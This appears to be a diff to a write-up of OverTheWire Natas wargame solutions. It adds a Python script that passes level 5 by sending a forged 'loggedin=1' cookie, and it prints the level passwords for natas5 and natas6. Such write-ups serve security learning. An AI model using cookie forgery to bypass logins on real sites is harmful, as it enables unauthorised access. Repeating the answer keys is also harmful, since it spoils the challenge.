@@ -253,3 +253,29 @@ Done !
 ```text
 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 ```
+
+*Or this way*
+
+```python
+import requests
+import re
+
+user = 'natas5'
+pwd = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
+
+cookies = { 'loggedin' : '1' }
+url = 'http://%s.natas.labs.overthewire.org/' % user
+
+session = requests.Session()
+response = session.get(url, auth = (user, pwd), cookies = cookies)
+content = response.text
+
+print(content)
+```
+
+
+***
+# Natas Level 6 Solution
+***
+**URL:** [http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org) <br/>
+**Datum:** natas6-aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
